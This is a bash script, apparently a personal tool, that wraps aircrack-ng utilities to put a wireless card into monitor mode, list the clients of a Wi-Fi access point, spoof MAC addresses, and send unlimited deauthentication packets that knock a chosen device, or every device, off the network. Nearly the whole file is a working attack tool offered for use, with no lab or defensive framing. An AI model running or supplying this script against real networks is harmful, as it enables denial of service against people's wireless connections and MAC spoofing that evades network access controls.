#!/usr/bin/env bash

# all the  pachages needed in the script
packgeNeeded=("aircrack-ng" "iw" "wireless-tools" "network-manager" "macchanger" )

# echo help if no arguments were given 
if [ $# -eq 0 ]
then
    echo -e "-h for help"
fi

# Get arguments 
# reset True > disable monitor mode befor exit
# r and l without : coz thir is no expected input 
while getopts "b:e:vharl:c:t:d:i:m:A" option ; 
do
    case $option in
        e) # set wiff essid
            wifiEssid=$OPTARG;;
        b) # set wiff bssid 
            wifiBssid=$OPTARG;;
        r) # to disable monitor mode befor exit
            reset=True;;
        h) # Display help
            echo -e "-e for wifi essid\n-b for wifi bssid\n-r disable monitor mode\n-l list wifi\n-c target mac address\n-t check if mac is online\n-i interface name\n[Mac] only mac for mac vendore\n-m [mac]  -i [interface] change mac\n-A -i [interface]reset mac "
            exit ;;
        l) # display wifi scan - to know the bssid for the acess point
            nmcli device wifi list ifname $OPTARG || echo -e "\n-l interface name "
            exit
            ;;
        c) # set the target mac address
            targetMac=$OPTARG
            ;;
        a) # if you want to kick all the devices in the network
            Kickall=True
            ;;
        t) # set mac address to see if it's online or not
            checkTarget=$OPTARG
            ;;
        v) # display all the mac address vendore
            allVendor=True
            ;;
        d) # how much deauthentication attack packets to send
            numberOfKickPackets=$OPTARG
            ;;
        i) # set the interface name 
            interfaceName=$OPTARG
            ;;
        m) # set mac to spoof
            newMac=$OPTARG
            ;;
        A) # reset the orignal mac address
            resetMac=True
            ;;
        \?) # unexpected arguments 
            echo -e "\nunexpected argument run -h for help "
            exit;;
    esac 
done

# ================================= Functions ================================= #

# check if all used packages are installed
# dpkg -s $1 &> /dev/null [ $? -eq 0 ]  0 > installed , 1 > not installed

function installAllPackages(){
    read -p "Do you want to install missing Packages [y]: " answer
    if [[ $answer =~ [yY] ]];then sudo apt-get install -y ${packgeNeeded[@]}  ;else echo You must install all packges && exit ;fi
    
}


# start monitor mode 
function startMonitorMode {
    # check for interface name 
    if [ ! -z $interfaceName ]
    then
        interface=$interfaceName
    else
        # get the current interface name
        interface=$(iw dev | grep Interface |cut -d " " -f2)
    fi

    # Check if monitor mode is on 
    interfaceMode=$(iwconfig $interface |grep -o Monitor)
    # if $interfaceMode is not empty > return interface name else start monitor mode
    if [ ! -z $interfaceMode ]
    then
        echo "$interface"
    else
        sudo airmon-ng start $interface > /dev/null 2>&1
        interface=$(iw dev | grep Interface |cut -d " " -f2)
        echo "$interface"
        
    fi

}


# stop monitor mode 
function stopMonitorMode() {
    interface=$(iw dev | grep Interface |cut -d " " -f2)
    sudo airmon-ng stop $interface > /dev/null 2>&1
    echo seting MonitorMode off
    # Check if monitor mode is off
    interfaceMode=$(iwconfig $interface |grep -o Monitor)
    # if monitor mode still enabled 
    # Try another way to stop it 
    if [ ! -z $interfaceMode ]
    then
        sudo ifconfig $interface down 
        sudo iwconfig $interface mode Managed
        sudo ifconfig $interface up
    else
        echo "Monitor mode is off"
    fi
    
}

function resetMode(){
    if [ ! -z $reset ]
    then
        stopMonitorMode 
    fi

}

# Get mac list 
function GetMacList() {
    # start monitor mode and return the name of the interface
    # interfacee=$(startMonitorMode)
    echo $interface is on Monitor Mode
    
    # $1 is the target bssid -d [Mac]
    sudo airodump-ng $1 -i $interface --output-format csv -w temp
    echo -e "\n------------------- Results ---------------------\n"
    # grep the devices mac if check target only check for one mac else display all connected mac
    if [ ! -z $checkTarget ]
    then
        if grep -q "$2" temp-01.csv ; then echo -e "\n$2 is online" ; else echo not found; fi
        sudo rm -f temp*
    else
        cat temp-01.csv | cut -d , -f 1 > result
        # display all mac address vendors
        if [ ! -z $allVendor ]
        then
            # loop through all mac regex
            for i in $(grep "^..:" result)
            do 
                macVendore=$(deviceVendore $i)
                echo -e "\n$i is $macVendore" ; 
            done
        else
            cat result
        fi
        sudo rm -f temp* result
    fi
    echo -e "\n\n------------------- Results ---------------------\n"
    resetMode
}


# Kick user by mac address
function kickUser(){
    # $1 for bssid - $2 for interfacename 
    if [ $Kickall ]
    then
        sudo aireplay-ng --deauth 0 -a $1 $2
    elif [ ! -z $numberOfKickPackets ]
    then
        sudo aireplay-ng --deauth $numberOfKickPackets -a $1 -c $2 $3 || echo -e "\nuse iwconfig [ interface ] channel [AP channel Num] then retry"
    else
        sudo aireplay-ng --deauth 0 -a $1 -c $2 $3
    fi
    resetMode
}

function deviceVendore(){
    # changeing the mac format form ..:.. to ..-..
    mac=$(echo $1 | tr ":" "-")
    mac=${mac:0:8}
    # if the vendore database exist search for mac in it else download it from github
    if [ -f vendor.txt ]; then
        grep -i $mac vendor.txt |cut -f 3
    else
        echo "vendor database file doesn't exist"
        read -p "Do you wand to download it[y]: " answer
        if [[ $answer =~ [yY] ]];then wget https://github.com/1Mr12/bash/raw/main/wifi/vendor.txt > /dev/null 2>&1 ;fi
        deviceVendore $1
    fi
}



function spoofMac(){
    # set new mac address only if interface name and new mac is given
    if [ ! -z $1 ] && [ ! -z $2 ]
    then
        echo "Spoof Mac to $1"
        sudo ifconfig $2 down
        sudo macchanger -m $1 $2
        sudo ifconfig $2 up
    elif [ -z $1 ] && [ -z $2 ] #reset the mac address if no given arguments
    then
        echo "Reset Mac to orignal"
        sudo macchanger -p $interfaceName
    fi
}

# ================================= Functions ================================= #

# Check for all needed packges first  - if one is missing > install all
dpkg -s ${packgeNeeded[@]} > /dev/null 2>&1 || installAllPackages 


# ================================= Main ================================= #

# if the only bessid is given 
if [ ! -z $wifiBssid ] && [ -z $targetMac ] && [ -z $Kickall ] && [ -z $checkTarget ]
then
    interface=$(startMonitorMode)
    # Start GetMacList function with essid option
    GetMacList "-d $wifiBssid"
    echo -e "\nuse -b essid -c TargeMac option to kick user"
    exit
elif [ ! -z $wifiEssid ]
then
    interface=$(startMonitorMode)
    # Start GetMacList function with essid option
    GetMacList "--essid $wifiEssid"
    echo -e "\nuse -b essid -c TargeMac option to kick user"
    exit
elif [ ! -z $wifiBssid ] && [ ! -z $targetMac ]
then
    interface=$(startMonitorMode)
    kickUser $wifiBssid $targetMac $interface
    exit
elif [ ! -z $wifiBssid ] && [ ! -z $Kickall ] 
then
    interface=$(startMonitorMode)
    kickUser $wifiBssid $interface $Kickall
    exit
elif [ ! -z $wifiBssid ] && [ $checkTarget ]
then
    interface=$(startMonitorMode)
    GetMacList "-d $wifiBssid" $checkTarget
elif [ ! -z $newMac ] && [ ! -z $interfaceName ]
then
    spoofMac $newMac $interfaceName
else
    #echo -e "You Must Give Essid or bssid \n"
    # if only mac is given show the vendore of it
    if [[ $1 =~ ":" ]]
    then
        deviceVendore $1
    elif [[ $1 == "-r" ]]
    then
        resetMode
    elif [[ ! -z $resetMac ]]
    then
        spoofMac 
    fi
fi

